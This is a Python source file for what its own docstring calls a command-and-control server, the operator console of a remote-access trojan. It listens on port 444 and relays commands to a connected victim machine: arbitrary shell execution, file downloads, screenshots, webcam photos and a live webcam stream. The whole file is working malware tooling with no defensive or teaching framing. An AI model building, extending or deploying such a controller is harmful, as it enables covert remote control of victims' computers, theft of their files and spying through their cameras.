import socket
import sys
import logging
from pathlib import Path
from typing import Optional
import functions

# Configuration
CONFIG = {
    'host': "0.0.0.0",  # Listen on all interfaces
    'port': 444,
    'buffer_size': 4096,
    'max_response_size': 1024 * 1024  # 1MB
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class Server:
    """Command and control server with improved structure."""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.connection: Optional[socket.socket] = None
        self.client_address: Optional[tuple] = None
    
    def start(self) -> bool:
        """Initialize and start the server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            
            logger.info(f"Server listening on {self.host}:{self.port}")
            return True
            
        except socket.error as e:
            logger.error(f"Server start error: {e}")
            return False
    
    def accept_connection(self) -> bool:
        """Accept incoming client connection."""
        try:
            logger.info("Waiting for connection...")
            self.connection, self.client_address = self.socket.accept()
            logger.info(f"Connected with {self.client_address[0]}:{self.client_address[1]}")
            return True
        except socket.error as e:
            logger.error(f"Connection accept error: {e}")
            return False
    
    def send_command(self, command: str) -> bool:
        """Send command to client."""
        try:
            self.connection.sendall(command.encode('utf-8'))
            return True
        except socket.error as e:
            logger.error(f"Command send error: {e}")
            return False
    
    def receive_response(self, max_size: int = CONFIG['max_response_size']) -> Optional[bytes]:
        """Receive response from client."""
        try:
            data = b""
            while len(data) < max_size:
                chunk = self.connection.recv(CONFIG['buffer_size'])
                if not chunk:
                    break
                data += chunk
                if b"DONE" in chunk or len(chunk) < CONFIG['buffer_size']:
                    break
            return data
        except socket.error as e:
            logger.error(f"Response receive error: {e}")
            return None
    
    def handle_download(self, filename: str):
        """Handle file download from client."""
        logger.info(f"Downloading file: {filename}")
        functions.download(filename, self.connection)
    
    def handle_capture(self, capture_type: str):
        """Handle screenshot or photo capture."""
        logger.info(f"Capturing {capture_type}...")
        functions.photo_capture(self.connection)
    
    def handle_webcam(self):
        """Handle webcam stream."""
        logger.info("Starting webcam stream...")
        functions.webcam()
    
    def process_command(self, command: str) -> bool:
        """Process user command."""
        command = command.strip()
        
        if not command:
            return True
        
        if command == "terminate":
            logger.info("Terminating connection...")
            self.send_command(command)
            return False
        
        elif command == "help":
            self.print_help()
            return True
        
        elif command.startswith("download "):
            filename = command[9:].strip()
            if not filename:
                print("Usage: download <filename>")
                return True
            self.send_command(command)
            self.handle_download(filename)
        
        elif command in ("screenshot", "campic"):
            self.send_command(command)
            self.handle_capture(command)
        
        elif command == "webcam":
            self.send_command(command)
            self.handle_webcam()
        
        else:
            self.send_command(command)
            response = self.receive_response()
            if response:
                try:
                    print(response.decode('utf-8', errors='ignore'))
                except Exception as e:
                    logger.error(f"Response decode error: {e}")
                    print(f"[Binary response: {len(response)} bytes]")
        
        return True
    
    def print_help(self):
        """Print available commands."""
        help_text = """
Available Commands:
  cd <path>         - Change directory
  download <file>   - Download file from client
  screenshot        - Capture screenshot
  campic            - Capture photo from webcam
  webcam            - Start webcam stream
  terminate         - Close connection and exit
  help              - Show this help message
  
  Any other command will be executed on the client system.
        """
        print(help_text)
    
    def run(self):
        """Main server loop."""
        if not self.start():
            return
        
        if not self.accept_connection():
            return
        
        self.print_help()
        
        try:
            while True:
                try:
                    command = input("\n> ").strip()
                    if not self.process_command(command):
                        break
                except EOFError:
                    break
                except KeyboardInterrupt:
                    print("\nUse 'terminate' to exit properly")
                    continue
                    
        except Exception as e:
            logger.error(f"Server error: {e}")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Clean up resources."""
        if self.connection:
            self.connection.close()
        if self.socket:
            self.socket.close()
        logger.info("Server stopped")


def main():
    """Entry point."""
    server = Server(CONFIG['host'], CONFIG['port'])
    server.run()


if __name__ == "__main__":
    main()
